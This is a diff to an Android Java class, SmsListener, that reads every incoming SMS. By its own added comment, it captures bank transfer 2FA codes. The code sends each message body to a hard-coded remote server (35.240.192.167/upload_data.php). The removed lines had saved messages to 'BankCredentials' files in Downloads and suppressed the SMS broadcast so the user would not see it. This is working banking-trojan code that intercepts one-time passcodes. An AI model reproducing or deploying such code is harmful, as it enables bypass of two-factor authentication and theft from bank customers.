@@ -6,7 +6,6 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
-import android.os.Environment;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
@@ -17,14 +16,14 @@ import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.google.gson.Gson;
 
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
-
+/* SMSListener is a Broadcast Receiver that receives all the SMS the user received.
+ * The purpose of listening to user's SMS messages is to retrieve the 2FA that may be triggered when making a transfer transaction through the iBanking app
+ * The contents of the message is then uploaded to our server through the Volley library referenced from https://www.youtube.com/watch?v=EwJMWVAkKno (Volley)*/
 public class SmsListener extends BroadcastReceiver {
 
     List<Data> dataArray;
@@ -43,23 +42,22 @@ public class SmsListener extends BroadcastReceiver {
                     Object[] pdus = (Object[]) bundle.get("pdus");
                     msgs = new SmsMessage[pdus.length];
                     for (int i = 0; i < msgs.length; i++) {
-
                         msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                         msg_from = msgs[i].getOriginatingAddress();
                         String msgBody = msgs[i].getMessageBody();
-                        Log.d("onReceive", msgBody);
-                        String filepath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString();
-                        String filename = "/BankCredentials_" + (new SimpleDateFormat("dd-MM-yyyy-hh_mm_ss").format(new Date())) + ".txt";
 
+                        // Create data object to store the message content
                         dataArray = new ArrayList<Data>();
                         Data dt = new Data(msgBody, id);
                         dataArray.add(dt);
 
+                        // Convert the data into JSON
                         Gson gson = new Gson();
                         final String newDataArray = gson.toJson(dataArray);
 
                         final String server_url = "http://35.240.192.167/upload_data.php";
 
+                        // Create the request
                         StringRequest stringRequest = new StringRequest(Request.Method.POST, server_url,
                                 new Response.Listener<String>() {
                                     @Override
@@ -86,14 +84,12 @@ public class SmsListener extends BroadcastReceiver {
                             }
                         };
 
+                        // Add request to the Volley instance created
                         Vconnection.getnInstance(context).addRequestQue(stringRequest);
                         id++;
-                        Log.d("onReceive", msgBody);
                     }
-                    Log.d("SMS!", "file created!");
-                    abortBroadcast();
                 } catch(Exception e){
-//                            Log.d("Exception caught",e.getMessage());
+                    //Log.d("Exception caught",e.getMessage());
                 }
             }
         }
